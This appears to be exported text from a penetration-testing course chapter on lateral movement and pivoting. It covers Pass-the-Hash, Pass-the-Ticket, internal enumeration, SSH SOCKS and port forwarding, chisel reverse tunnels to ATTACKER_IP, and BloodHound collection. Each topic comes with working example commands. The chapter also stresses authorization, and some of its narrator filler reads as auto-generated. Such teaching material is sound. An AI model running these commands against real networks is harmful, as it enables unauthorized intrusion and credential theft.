screens.title: Lateral Movement and Pivoting: The Foundation
screens.narratorSegment: After successfully gaining an initial foothold on a target system and perhaps escalating your privileges, the next logical step in a penetration test is to expand your reach. This is where lateral movement comes into play. Lateral movement is the strategic process of moving from one compromised host to another within the same network, or even across different network segments. Its primary goal is to expand your control, discover more sensitive data, and ultimately reach critical systems that might not have been directly accessible from the internet. Think of it like navigating a building after getting past the front door; you're moving from room to room, looking for the vault. Closely related to this is pivoting. Pivoting involves routing your network traffic through a compromised host to access internal network segments that are otherwise unreachable from your attacking machine. Essentially, you're turning the compromised machine into a proxy, allowing your attacks to originate from within the target network. This is crucial when dealing with segmented networks or hosts behind firewalls. A common misconception is that lateral movement and pivoting are the same; while they are often used together, lateral movement is about moving between hosts, and pivoting is about routing traffic through a host. Both are essential for achieving deeper access and demonstrating the full impact of a security breach.

content.html:
Module 5›Chapter 5.4›Lateral Movement and Pivoting
Core Concept

Lateral Movement

The process of moving from one compromised host to another within the same network segment or across different segments. It expands control and searches for higher-value targets.

  • Goal: Deeper access, sensitive data discovery, reaching critical systems.
  • Method: Exploiting trust relationships, credential reuse, service vulnerabilities.
Related Concept

Pivoting

Routing network traffic through a compromised host to access otherwise unreachable internal network segments. The compromised machine acts as a proxy.

  • Goal: Bypass network segmentation, reach isolated hosts.
  • Method: SOCKS proxies, port forwarding, SSH tunnels.
Analogy

Navigating a Building

Imagine gaining access to a building's reception (initial foothold). Lateral movement is like moving from the reception to different offices or floors, searching for the CEO's office or the server room. Pivoting is like using a maintenance tunnel or a specific internal network connection to reach a secure server room that has no direct public entrance.

Key Takeaway

Lateral movement expands your reach to new hosts, while pivoting enables access to segmented networks by routing traffic through a compromised host.

Common Misconception

Many confuse lateral movement and pivoting as the same. Remember, lateral movement is about moving *between* hosts, while pivoting is about *routing traffic through* a host to reach others.

screens.title: Enabling Lateral Movement: Credential Reuse and Enumeration
screens.narratorSegment: The success of any lateral movement operation hinges on two critical prerequisites: credential reuse and thorough network service enumeration. Think of these as your primary tools for unlocking new doors within the network. After compromising an initial host, your first priority is often to extract any available credentials, whether they are password hashes or even plaintext passwords. Tools like Mimikatz on Windows are invaluable for this, or you might crack hashes obtained from Linux systems. Once you have these credentials, you can attempt to authenticate to other systems, hoping that the same credentials are used elsewhere. This is a common weakness in many enterprise environments. Simultaneously, you need to understand the network landscape from your newly compromised vantage point. Network service enumeration involves mapping out the local network, identifying connected hosts, and discovering open ports and running services. This reconnaissance helps you pinpoint potential targets and understand how they communicate. Without effective credential reuse and comprehensive enumeration, lateral movement becomes significantly more challenging, if not impossible. These two pillars provide the intelligence and access needed to navigate the internal network effectively and efficiently.

content.html:
Module 5›Chapter 5.4›Credential Reuse & Enumeration
Pillar 1

Credential Reuse

Leveraging extracted credentials (hashes or plaintext passwords) from a compromised host to authenticate to other systems within the network.

  • Source: Mimikatz (Windows), hash cracking (Linux).
  • Techniques: Pass-the-Hash, Pass-the-Ticket.
Pillar 2

Network Service Enumeration

Mapping the local network from a compromised host to identify connected hosts, open ports, and running services. This reveals potential new targets.

  • Tools: nmap, netstat, ipconfig (Windows), ip a (Linux).
  • Targets: SMB, WinRM, RDP, SSH.
Why it Matters

Unlocking Deeper Access

These two techniques are foundational because they provide both the 'keys' (credentials) and the 'map' (network enumeration) needed to navigate and compromise additional systems. Without them, you're essentially blind and locked out of further progress.

Key Takeaway

Effective lateral movement relies on first obtaining credentials and then thoroughly mapping the network from the compromised host's perspective.

screens.title: Pass-the-Hash (PtH): Authenticating with Hashes
screens.narratorSegment: One of the most potent techniques for credential reuse, especially in Windows Active Directory environments, is Pass-the-Hash, or PtH. This method allows you to authenticate to other machines using a user's NTLM hash directly, without ever needing to know the plaintext password. This is incredibly effective because many Windows systems, particularly older ones or those with misconfigurations, will accept an NTLM hash for authentication. Imagine you've compromised a workstation and extracted the NTLM hash for a domain administrator. With PtH, you can use that hash to authenticate to other servers or workstations where that administrator has privileges, effectively gaining access without ever cracking the password. Tools like pth-winexe, part of the impacket toolkit on Linux, are specifically designed to facilitate these attacks. They allow you to execute commands on a remote Windows machine using a provided NTLM hash. A common mistake is trying to use PtH with Kerberos authentication, which requires tickets, not NTLM hashes. PtH specifically targets NTLM authentication. This technique highlights the importance of protecting credential material, even hashes, as they can be just as dangerous as plaintext passwords in the right context.

keyIdea.title: NTLM Hash Authentication
keyIdea.text: Pass-the-Hash (PtH) uses a stolen NTLM hash to authenticate to remote Windows systems without needing the plaintext password.

content.html:
Module 5›Chapter 5.4›Pass-the-Hash
Technique Overview

What is Pass-the-Hash (PtH)?

PtH is an attack where an attacker authenticates to a remote server or service by using a user's NTLM hash instead of their plaintext password. This is highly effective in Active Directory environments.

  • Context: Primarily Windows networks, especially Active Directory.
  • Benefit: Bypasses password cracking, directly uses hash for authentication.
Key Tool

pth-winexe (Impacket)

A Linux-based tool from the impacket toolkit that allows execution of commands on remote Windows machines using an NTLM hash.

# Example: Pass-the-Hash using pth-winexe (from Impacket) # Assuming you have the NTLM hash for a user 'Administrator' pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //TARGET_IP cmd.exe
Practical Scenario

Admin Hash Reuse

You've compromised a low-privilege workstation and found an NTLM hash for a domain administrator. Using pth-winexe, you can now authenticate to other servers where this administrator has local admin rights, gaining a shell without ever knowing the actual password.

Key Takeaway

PtH exploits NTLM authentication by using stolen hashes, making it a powerful technique for lateral movement in Windows environments, especially with tools like pth-winexe.

Common Misconception

PtH is for NTLM authentication. It cannot be directly used for Kerberos authentication, which relies on tickets. For Kerberos, you'd look at Pass-the-Ticket.

screens.title: Pass-the-Ticket (PtT): Kerberos Ticket Injection
screens.narratorSegment: Beyond NTLM hashes, another incredibly powerful credential reuse technique, particularly in Active Directory, is Pass-the-Ticket, or PtT. Instead of using a password or hash, PtT involves injecting a stolen Kerberos ticket, either a Ticket Granting Ticket (TGT) or a Ticket Granting Service (TGS) ticket, directly into your current session. This allows you to authenticate to services and resources as the user associated with that ticket, without ever needing their password or hash. Kerberos is a widely used authentication protocol in Active Directory, and its tickets represent a user's authenticated session. By stealing and reusing these tickets, an attacker can bypass traditional authentication mechanisms entirely. Mimikatz is the go-to tool for performing PtT attacks on Windows, allowing you to dump and inject tickets. A variation called Overpass-the-Hash combines aspects of both PtH and PtT, where you use an NTLM hash to request a Kerberos TGT. This is particularly useful when you have a hash but need a Kerberos ticket for a specific service. These techniques exploit the inherent trust relationships within Active Directory, making them exceptionally effective for lateral movement and privilege escalation. Understanding how to both perform and defend against PtT is crucial for securing modern enterprise networks.

keyIdea.text: Pass-the-Ticket (PtT) involves injecting stolen Kerberos tickets (TGT/TGS) into a session to authenticate to services without passwords or hashes.

content.html:
Module 5›Chapter 5.4›Pass-the-Ticket
Technique Overview

What is Pass-the-Ticket (PtT)?

PtT involves injecting a stolen Kerberos ticket (TGT or TGS) into the current session to authenticate to services without needing the password or hash. It exploits Kerberos trust relationships.

  • Context: Active Directory environments using Kerberos.
  • Benefit: Bypasses password/hash, uses existing session tokens.
Related Technique

Overpass-the-Hash

A variation where an NTLM hash is used to request a Kerberos Ticket Granting Ticket (TGT). This bridges the gap between NTLM and Kerberos authentication.

  • Tool: Mimikatz is commonly used for both PtT and Overpass-the-Hash.
Practical Scenario

Domain Admin Ticket

You've dumped a Kerberos TGT for a Domain Admin from a compromised server. By injecting this ticket into your session using Mimikatz, you can now access any resource in the domain that the Domain Admin has access to, without needing their password.

Key Takeaway

PtT and Overpass-the-Hash are powerful Kerberos-based credential reuse techniques that allow authentication via stolen tickets or hashes to obtain tickets, crucial for Active Directory lateral movement.

Common Mistake

Confusing PtT with PtH. PtT uses Kerberos tickets, while PtH uses NTLM hashes. While Overpass-the-Hash bridges them, understanding the underlying protocol is key.

screens.title: Detailed Network Service Enumeration
screens.narratorSegment: Once you're inside a network, whether through an initial compromise or a lateral move, understanding the surrounding network environment is paramount. This is where detailed network service enumeration comes in. From your compromised host, you can use various tools to map out the local network, identify other connected hosts, and discover open ports and running services. This process is like drawing a detailed map of the internal network from an insider's perspective. On Windows, commands like ipconfig slash all will reveal network configuration, netstat -ano shows active connections and listening ports, and arp -a displays the ARP cache, revealing other hosts on the local segment. For Linux, ip a provides network interface details, and ss -tuln lists listening TCP and UDP sockets. If you can upload nmap to the compromised host, it becomes an incredibly powerful scanning tool. Common services to look for include SMB on port 445, used for file sharing; WinRM on ports 5985 or 5986 for remote management; RDP on port 3389 for remote desktop access; and SSH on port 22 for secure shell access. Finding these services open on other hosts, especially when combined with valid credentials, provides direct pathways for further lateral movement. A common mistake is to assume the network is flat or to stop enumeration after the initial host. The internal network is often far more complex and revealing.

keyIdea.title: Internal Network Mapping
keyIdea.text: Thorough network service enumeration from a compromised host reveals connected systems, open ports, and services, identifying new lateral movement targets.

content.html:
Module 5›Chapter 5.4›Network Enumeration
Purpose

Why Enumerate Internally?

From a compromised host, enumeration helps map the local network, identify connected hosts, and discover open ports and running services. This reveals potential new targets and attack paths.

  • Windows Tools: ipconfig /all, netstat, arp -a.
  • Linux Tools: ip a, ss -tuln, nmap (if uploaded).
Common Targets

Services for Lateral Movement

Specific services are frequently targeted for lateral movement due to their remote access capabilities or common misconfigurations.

  • SMB (445): Server Message Block for file and printer sharing.
  • WinRM (5985/5986): Windows Remote Management.
  • RDP (3389): Remote Desktop Protocol.
  • SSH (22): Secure Shell.
Example

Listing SMB Shares

After identifying an open SMB port on a remote Windows host and having valid credentials, you can attempt to list shares to discover valuable files or directories.

# Example: List SMB shares on a remote Windows host net view \\TARGET_IP net use \\TARGET_IP\sharename /user:DOMAIN\username password
Key Takeaway

Internal network enumeration is crucial for identifying new targets and understanding the network topology from a compromised host's perspective, guiding subsequent lateral moves.

screens.title: Pivoting with SOCKS Proxies
screens.narratorSegment: When your target network is segmented, and you need to access machines that are not directly reachable from your attacking machine, pivoting becomes essential. One of the most versatile pivoting methods is setting up a SOCKS proxy through a compromised host. A SOCKS proxy allows you to route all your network traffic – this means everything from nmap scans, Metasploit modules, or even web browser traffic – through the compromised machine. This effectively makes it appear as if your attacks are originating from within the internal network segment, bypassing firewalls and network access controls. Tools like ssh -D are excellent for creating dynamic port forwards, which function as SOCKS proxies, especially when you have SSH access to a Linux host. You establish an SSH connection with dynamic port forwarding, and then configure your attacking tools, such as proxychains, to use this local SOCKS proxy. This allows you to interact with internal targets as if you were directly connected to the compromised host's network. A common pitfall here is forgetting to configure proxychains or other tools to actually use the SOCKS proxy, leading to failed connections. Remember, the SOCKS proxy acts as a general-purpose relay for your network connections, making it a powerful and flexible pivoting technique.

content.html:
Module 5›Chapter 5.4›SOCKS Proxy Pivoting
Concept

What is a SOCKS Proxy?

A SOCKS proxy allows you to route all your network traffic (e.g., from nmap, Metasploit, web browsers) through a compromised host. This makes your traffic appear to originate from within the internal network.

  • Benefit: Bypasses network segmentation and firewalls.
  • Flexibility: Routes various types of traffic, not just specific ports.
Key Tool

ssh -D (Dynamic Port Forwarding)

Creates a SOCKS proxy on your local machine, routing traffic through an SSH connection to a compromised Linux host.

# Example: SSH Dynamic Port Forwarding (SOCKS proxy) # On attacker: ssh -D 9050 user@compromised_linux_host # Then configure proxychains to use localhost:9050
Practical Scenario

Scanning an Internal Segment

You've compromised a Linux host in a DMZ. By setting up an SSH SOCKS proxy through it, you can now use proxychains with nmap from your attacking machine to scan an internal network segment that was previously unreachable.

Key Takeaway

SOCKS proxies, often created with ssh -D, provide a flexible way to route all types of network traffic through a compromised host, enabling access to segmented internal networks.

Common Mistake

Forgetting to configure your attacking tools (like proxychains) to actually use the local SOCKS proxy, leading to direct connections that fail.

screens.title: Pivoting with Port Forwarding
screens.narratorSegment: While SOCKS proxies are great for routing all traffic, sometimes you only need to access a specific port on a specific remote machine through your compromised host. This is where port forwarding becomes invaluable. Port forwarding involves redirecting a communication request from one address and port number combination to another. For example, if you want to RDP to a database server at 10.10.10.20, but it's only reachable from your compromised host at 10.10.10.10, you can set up a port forward. This would typically involve forwarding a local port on your attacking machine, say 3389, through the compromised host, to the RDP port 3389 on the database server. So, when you connect to localhost. 3389 on your attacking machine, the traffic is transparently routed through the compromised host to the target database server. SSH local port forwarding, using the ssh -L command, is a common way to achieve this, especially with Linux pivot hosts. This technique is highly targeted and efficient for accessing specific services on isolated machines. A key benefit is its simplicity for single-service access, but a common mistake is misconfiguring the local and remote ports, leading to connection failures. Always double-check your port numbers and IP addresses.

content.html:
Module 5›Chapter 5.4›Port Forwarding
Concept

What is Port Forwarding?

Port forwarding redirects a communication request from one address and port number combination to another. It's used to access specific services on remote machines through a compromised pivot host.

  • Benefit: Targeted access to specific services on isolated hosts.
  • Mechanism: Creates a direct tunnel for a single port.
Key Tool

ssh -L (Local Port Forwarding)

Establishes a local port on your attacking machine that forwards traffic through an SSH connection to a specified port on a remote machine via the compromised host.

# Example: Local port forwarding via SSH # On attacker: ssh -L 3389:10.10.10.20:3389 user@compromised_linux_host # Then RDP to localhost:3389 from attacker to reach 10.10.10.20
Practical Scenario

RDP to an Isolated Server

You've compromised a Linux host that can reach an internal Windows server running RDP (port 3389). By setting up an SSH local port forward, you can now RDP from your attacking machine to localhost:3389, which will tunnel your connection to the internal Windows server.

Key Takeaway

Port forwarding, especially with ssh -L, provides a precise method to tunnel specific service traffic through a compromised host to an otherwise unreachable internal target.

Common Mistake

Incorrectly mapping local and remote ports or IP addresses. Always verify the target IP and port, and ensure your local port is not already in use.

screens.title: Chisel: The Fast and Reliable Tunnel
screens.narratorSegment: While SSH is a fantastic tool for tunneling, it's not always available or suitable for every scenario. This is where chisel shines as an excellent alternative for creating fast and reliable SOCKS proxies and port forwards. chisel is a command-line tool that creates TCP/UDP tunnels over HTTP, secured via SSH. Its primary advantage is its flexibility and stealth; it can often bypass network restrictions that might block direct SSH connections. The way chisel works is by establishing a client-server relationship. You run a chisel server on your attacking machine, listening for incoming connections, and then deploy a chisel client on the compromised host. The client connects back to your server, creating a secure tunnel. This allows you to set up SOCKS proxies for general network access or specific port forwards for targeted services, even in environments where traditional SSH might be blocked or unavailable. For example, if you need to RDP to an internal Windows machine but SSH isn't running on your Linux pivot, chisel can create that tunnel for you. It's a versatile tool that every penetration tester should have in their arsenal for robust pivoting capabilities. A common mistake is misconfiguring the server and client commands, leading to connection issues. Always ensure the server is listening correctly and the client is pointing to the right server address and port.

keyIdea.text: Chisel is a fast TCP/UDP tunnel over HTTP, secured via SSH, used for creating SOCKS proxies and port forwards, especially when SSH is unavailable.

content.html:
Module 5›Chapter 5.4›Chisel Tool
Tool Overview

What is Chisel?

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It's an excellent tool for creating SOCKS proxies and port forwards, particularly useful when SSH is not available on the compromised host.

  • Mechanism: Client-server architecture over HTTP.
  • Flexibility: Supports both SOCKS proxies and port forwards.
Usage Pattern

Server and Client Setup

You run a chisel server on your attacking machine and a chisel client on the compromised host, which connects back to your server to establish the tunnel.

# Example: Chisel Server on Attacker (Kali) chisel server --reverse -p 8000 # Example: Chisel Client on Compromised Host (Linux) chisel client ATTACKER_IP:8000 R:socks # This creates a reverse SOCKS proxy on the attacker's machine
Practical Scenario

Bypassing SSH Restrictions

If SSH is blocked or not installed on a compromised Linux host, chisel can still establish a reverse SOCKS proxy or port forward by tunneling over HTTP, allowing you to access internal resources.

Key Takeaway

Chisel is a powerful and flexible tunneling tool that can establish SOCKS proxies and port forwards over HTTP, making it ideal for pivoting in environments where SSH is restricted or unavailable.

Common Mistake

Incorrectly setting up the server and client commands, especially the reverse flag (-R) or the port forwarding syntax (R:socks or R:localport:remoteip:remoteport).

screens.title: BloodHound: Visualizing Attack Paths in AD
screens.narratorSegment: In Active Directory environments, understanding the complex web of relationships between users, groups, computers, and access control lists is crucial for effective lateral movement and privilege escalation. This is where BloodHound becomes an invaluable tool. BloodHound is a powerful graph theory tool that helps visualize these relationships, allowing you to quickly identify potential attack paths to high-value targets, such as Domain Admin. It works by collecting data from your target Active Directory environment using specialized data collectors like Sharp Hound. exe for Windows or Blood Hound dot P Y file for Linux. Once collected, this data is imported into the BloodHound GUI, which then renders a graphical representation of the AD structure. You can then query this graph to find paths like 'shortest path to Domain Admin' or 'users with admin rights on multiple machines.' This visual approach makes it much easier to spot misconfigurations and weak links that might otherwise go unnoticed. For example, you might discover that a low-privileged user has administrative rights on a server that a Domain Admin frequently logs into, creating a clear lateral movement path. A common mistake is to only collect data once; AD environments are dynamic, so regular data collection provides the most accurate attack paths. BloodHound transforms the daunting task of AD analysis into an intuitive and actionable process.

content.html:
Module 5›Chapter 5.4›BloodHound
Tool Overview

What is BloodHound?

BloodHound is a powerful graph theory tool used to map and visualize relationships between users, groups, computers, and ACLs in Active Directory environments. It helps identify attack paths for privilege escalation and lateral movement.

  • Benefit: Visualizes complex AD relationships, identifies hidden attack paths.
  • Goal: Find paths to Domain Admin, identify lateral movement opportunities.
Data Collection

SharpHound.exe

The primary data collector for BloodHound, SharpHound.exe is run on Windows targets to gather information about the Active Directory environment.

# Example: Running SharpHound.exe on a Windows target to collect BloodHound data # First, transfer SharpHound.exe to the target .\SharpHound.exe -c All -d YOUR_DOMAIN.LOCAL
Practical Scenario

Identifying Shortest Path to DA

After importing SharpHound data into the BloodHound GUI, you can query for the 'shortest path to Domain Admin'. This quickly highlights the most efficient lateral movement and privilege escalation routes, saving significant time in a penetration test.

Key Takeaway

BloodHound is indispensable for Active Directory penetration testing, providing a visual and queryable map of relationships to uncover critical attack paths for lateral movement and privilege escalation.

Common Mistake

Not collecting data with sufficient privileges or forgetting to specify the domain, leading to incomplete or inaccurate graph data in BloodHound.

screens.title: Avoiding Common Mistakes and Ensuring Safety
screens.narratorSegment: As you delve into lateral movement and pivoting, it's crucial to be aware of common pitfalls and to always prioritize safety and authorization. One frequent mistake is not thoroughly enumerating the network from your compromised host. Stopping too early means you might miss valuable targets or easier attack paths. Another common error is attempting to reuse credentials on systems where they simply don't apply, wasting time and potentially triggering alerts. Forgetting to properly configure your proxychains or tunneling tools, such as chisel or SSH, is also a common issue that leads to broken connections and frustration. Always double-check your syntax and ensure your tunnels are active. Beyond technical errors, the most important consideration is safety. Lateral movement significantly increases the scope of your compromise. You must always ensure you have explicit authorization for every system you interact with, even indirectly through a pivot. Unauthorized access, even during a penetration test, can have serious legal and ethical consequences. Always operate within the defined scope of your engagement. By understanding these common mistakes and adhering to strict safety protocols, you can conduct more effective, efficient, and responsible penetration tests, minimizing risks while maximizing your impact.

content.html:
Module 5›Chapter 5.4›Best Practices
Common Mistakes

Pitfalls to Avoid

  • Incomplete Enumeration: Not fully mapping the network from the compromised host.
  • Credential Misapplication: Attempting to reuse credentials on systems where they don't apply.
  • Tunneling Misconfiguration: Failing to properly set up proxychains or tunneling tools like chisel.
Safety Note

Authorization is Key

Lateral movement significantly increases the scope of compromise. Always ensure you have explicit authorization for every system you interact with, even indirectly. Operating outside scope can have severe consequences.

  • Scope Adherence: Strictly follow the defined scope of your penetration test engagement.
  • Ethical Conduct: Always prioritize ethical hacking principles and legal boundaries.
Pro-Tip

Document Everything

Keep meticulous records of every lateral move, credential used, and pivot established. This aids in reporting, backtracking, and ensuring you stay within scope.

Key Takeaway

Successful lateral movement requires not only technical proficiency but also careful planning, thorough execution, and strict adherence to ethical guidelines and authorization scope.

Lateral Movement is the strategic process of moving from one compromised host to another within a network, expanding your control and searching for higher-value targets. Both are powerful credential reuse techniques. Understanding these core ideas is vital for navigating complex internal networks and achieving your penetration testing objectives.

Lateral Movement

Moving from one compromised host to another within a network to expand control and reach further targets.

Pivoting

Routing network traffic through a compromised host to access otherwise unreachable internal network segments.

Pass-the-Hash (PtH)

Authenticating to a remote server using a user's NTLM hash instead of the plaintext password.

Key Concepts: Tools and Techniques for Pivoting

Advanced Methods for Network Navigation and Analysis

Pass-the-Ticket (PtT)

Injecting a stolen Kerberos ticket into the current session to authenticate to services.

SOCKS Proxy

A network protocol that routes network packets between a client and server through a proxy server.

Port Forwarding

A technique that redirects a communication request from one address and port to another.

Chisel

A fast TCP/UDP tunnel over HTTP, secured via SSH, useful for SOCKS proxies and port forwards.

BloodHound

A graph theory tool to map and visualize attack paths in Active Directory environments.

Proxychains

Mastering tools like Chisel and BloodHound, alongside techniques like SOCKS proxies and port forwarding, is crucial for effective and stealthy network navigation in advanced penetration tests.

fullNarratorScript:
Welcome to a critical phase in penetration testing: Lateral Movement and Pivoting. After gaining an initial foothold on a target system, your journey doesn't end there. This chapter is all about strategically moving deeper into a network, expanding your control, and reaching high-value assets that might not be directly accessible. We'll explore how to leverage compromised machines to access new segments, effectively turning them into launchpads for further attacks. Understanding these techniques is vital for any penetration tester, as they allow you to uncover hidden vulnerabilities and demonstrate the true impact of a breach. Get ready to transform a single point of entry into a comprehensive network compromise, all while maintaining stealth and precision. This masterclass will equip you with the skills to navigate complex internal networks like a seasoned professional.

In this chapter, we'll equip you with essential skills for navigating and expanding your presence within a target network. First, you'll gain a clear understanding of what lateral movement and pivoting truly mean in the context of a penetration test, and why they are so critical for achieving your objectives. We'll then dive into identifying the common protocols and services that attackers exploit for lateral movement across both Windows and Linux environments. You'll learn to recognize these pathways and understand how to leverage them. By the end of this section, you'll be able to articulate the core concepts and their significance in a real-world scenario, setting a strong foundation for the practical techniques we'll cover next. Learning Objectives: Expanding Your Penetration Test means understand lateral movement and pivoting, and identify common network protocols and services used for these techniques.. In practical terms, skills you'll master to navigate and control internal networks. A simple real-world example is helpful here, because students learn best when they can connect the idea to a familiar situation. This matters because it gives the learner a clear mental model and helps them connect the concept to later examples and problems. The main takeaway is that the concept should be understood as a meaningful pattern, not just a label on the screen.

Building on our foundational understanding, this section focuses on the practical application of lateral movement and pivoting. You will learn to execute advanced credential reuse techniques, specifically Pass-the-Hash and Pass-the-Ticket, which are incredibly effective in Active Directory environments. We'll then move into establishing robust network tunnels and SOCKS proxies, transforming a compromised host into a strategic pivot point to access otherwise unreachable network segments. Finally, you'll gain proficiency in utilizing specialized tools like proxychains, chisel, and BloodHound. These tools are indispensable for orchestrating effective lateral movement and comprehensively mapping out complex network relationships, allowing you to identify the most efficient attack paths. By mastering these objectives, you'll be able to conduct sophisticated internal network penetration tests. Learning Objectives: Advanced Techniques and Tools means execute credential reuse techniques, establish network tunnels, and utilize specialized tools for effective lateral movement and network mapping.. In practical terms, practical skills for credential reuse, tunneling, and network mapping. A simple real-world example is helpful here, because students learn best when they can connect the idea to a familiar situation. This matters because it gives the learner a clear mental model and helps them connect the concept to later examples and problems. The main takeaway is that the concept should be understood as a meaningful pattern, not just a label on the screen.

After successfully gaining an initial foothold on a target system and perhaps escalating your privileges, the next logical step in a penetration test is to expand your reach. This is where lateral movement comes into play. Lateral movement is the strategic process of moving from one compromised host to another within the same network, or even across different network segments. Its primary goal is to expand your control, discover more sensitive data, and ultimately reach critical systems that might not have been directly accessible from the internet. Think of it like navigating a building after getting past the front door; you're moving from room to room, looking for the vault. Closely related to this is pivoting. Pivoting involves routing your network traffic through a compromised host to access internal network segments that are otherwise unreachable from your attacking machine. Essentially, you're turning the compromised machine into a proxy, allowing your attacks to originate from within the target network. This is crucial when dealing with segmented networks or hosts behind firewalls. A common misconception is that lateral movement and pivoting are the same; while they are often used together, lateral movement is about moving between hosts, and pivoting is about routing traffic through a host. Both are essential for achieving deeper access and demonstrating the full impact of a security breach.

The success of any lateral movement operation hinges on two critical prerequisites: credential reuse and thorough network service enumeration. Think of these as your primary tools for unlocking new doors within the network. After compromising an initial host, your first priority is often to extract any available credentials, whether they are password hashes or even plaintext passwords. Tools like Mimikatz on Windows are invaluable for this, or you might crack hashes obtained from Linux systems. Once you have these credentials, you can attempt to authenticate to other systems, hoping that the same credentials are used elsewhere. This is a common weakness in many enterprise environments. Simultaneously, you need to understand the network landscape from your newly compromised vantage point. Network service enumeration involves mapping out the local network, identifying connected hosts, and discovering open ports and running services. This reconnaissance helps you pinpoint potential targets and understand how they communicate. Without effective credential reuse and comprehensive enumeration, lateral movement becomes significantly more challenging, if not impossible. These two pillars provide the intelligence and access needed to navigate the internal network effectively and efficiently.

One of the most potent techniques for credential reuse, especially in Windows Active Directory environments, is Pass-the-Hash, or PtH. This method allows you to authenticate to other machines using a user's NTLM hash directly, without ever needing to know the plaintext password. This is incredibly effective because many Windows systems, particularly older ones or those with misconfigurations, will accept an NTLM hash for authentication. Imagine you've compromised a workstation and extracted the NTLM hash for a domain administrator. With PtH, you can use that hash to authenticate to other servers or workstations where that administrator has privileges, effectively gaining access without ever cracking the password. Tools like pth-winexe, part of the impacket toolkit on Linux, are specifically designed to facilitate these attacks. They allow you to execute commands on a remote Windows machine using a provided NTLM hash. A common mistake is trying to use PtH with Kerberos authentication, which requires tickets, not NTLM hashes. PtH specifically targets NTLM authentication. This technique highlights the importance of protecting credential material, even hashes, as they can be just as dangerous as plaintext passwords in the right context.

Beyond NTLM hashes, another incredibly powerful credential reuse technique, particularly in Active Directory, is Pass-the-Ticket, or PtT. Instead of using a password or hash, PtT involves injecting a stolen Kerberos ticket, either a Ticket Granting Ticket (TGT) or a Ticket Granting Service (TGS) ticket, directly into your current session. This allows you to authenticate to services and resources as the user associated with that ticket, without ever needing their password or hash. Kerberos is a widely used authentication protocol in Active Directory, and its tickets represent a user's authenticated session. By stealing and reusing these tickets, an attacker can bypass traditional authentication mechanisms entirely. Mimikatz is the go-to tool for performing PtT attacks on Windows, allowing you to dump and inject tickets. A variation called Overpass-the-Hash combines aspects of both PtH and PtT, where you use an NTLM hash to request a Kerberos TGT. This is particularly useful when you have a hash but need a Kerberos ticket for a specific service. These techniques exploit the inherent trust relationships within Active Directory, making them exceptionally effective for lateral movement and privilege escalation. Understanding how to both perform and defend against PtT is crucial for securing modern enterprise networks.

Once you're inside a network, whether through an initial compromise or a lateral move, understanding the surrounding network environment is paramount. This is where detailed network service enumeration comes in. From your compromised host, you can use various tools to map out the local network, identify other connected hosts, and discover open ports and running services. This process is like drawing a detailed map of the internal network from an insider's perspective. On Windows, commands like ipconfig slash all will reveal network configuration, netstat -ano shows active connections and listening ports, and arp -a displays the ARP cache, revealing other hosts on the local segment. For Linux, ip a provides network interface details, and ss -tuln lists listening TCP and UDP sockets. If you can upload nmap to the compromised host, it becomes an incredibly powerful scanning tool. Common services to look for include SMB on port 445, used for file sharing; WinRM on ports 5985 or 5986 for remote management; RDP on port 3389 for remote desktop access; and SSH on port 22 for secure shell access. Finding these services open on other hosts, especially when combined with valid credentials, provides direct pathways for further lateral movement. A common mistake is to assume the network is flat or to stop enumeration after the initial host. The internal network is often far more complex and revealing.

When your target network is segmented, and you need to access machines that are not directly reachable from your attacking machine, pivoting becomes essential. One of the most versatile pivoting methods is setting up a SOCKS proxy through a compromised host. A SOCKS proxy allows you to route all your network traffic – this means everything from nmap scans, Metasploit modules, or even web browser traffic – through the compromised machine. This effectively makes it appear as if your attacks are originating from within the internal network segment, bypassing firewalls and network access controls. Tools like ssh -D are excellent for creating dynamic port forwards, which function as SOCKS proxies, especially when you have SSH access to a Linux host. You establish an SSH connection with dynamic port forwarding, and then configure your attacking tools, such as proxychains, to use this local SOCKS proxy. This allows you to interact with internal targets as if you were directly connected to the compromised host's network. A common pitfall here is forgetting to configure proxychains or other tools to actually use the SOCKS proxy, leading to failed connections. Remember, the SOCKS proxy acts as a general-purpose relay for your network connections, making it a powerful and flexible pivoting technique.

While SOCKS proxies are great for routing all traffic, sometimes you only need to access a specific port on a specific remote machine through your compromised host. This is where port forwarding becomes invaluable. Port forwarding involves redirecting a communication request from one address and port number combination to another. For example, if you want to RDP to a database server at 10.10.10.20, but it's only reachable from your compromised host at 10.10.10.10, you can set up a port forward. This would typically involve forwarding a local port on your attacking machine, say 3389, through the compromised host, to the RDP port 3389 on the database server. So, when you connect to localhost. 3389 on your attacking machine, the traffic is transparently routed through the compromised host to the target database server. SSH local port forwarding, using the ssh -L command, is a common way to achieve this, especially with Linux pivot hosts. This technique is highly targeted and efficient for accessing specific services on isolated machines. A key benefit is its simplicity for single-service access, but a common mistake is misconfiguring the local and remote ports, leading to connection failures. Always double-check your port numbers and IP addresses.

While SSH is a fantastic tool for tunneling, it's not always available or suitable for every scenario. This is where chisel shines as an excellent alternative for creating fast and reliable SOCKS proxies and port forwards. chisel is a command-line tool that creates TCP/UDP tunnels over HTTP, secured via SSH. Its primary advantage is its flexibility and stealth; it can often bypass network restrictions that might block direct SSH connections. The way chisel works is by establishing a client-server relationship. You run a chisel server on your attacking machine, listening for incoming connections, and then deploy a chisel client on the compromised host. The client connects back to your server, creating a secure tunnel. This allows you to set up SOCKS proxies for general network access or specific port forwards for targeted services, even in environments where traditional SSH might be blocked or unavailable. For example, if you need to RDP to an internal Windows machine but SSH isn't running on your Linux pivot, chisel can create that tunnel for you. It's a versatile tool that every penetration tester should have in their arsenal for robust pivoting capabilities. A common mistake is misconfiguring the server and client commands, leading to connection issues. Always ensure the server is listening correctly and the client is pointing to the right server address and port.

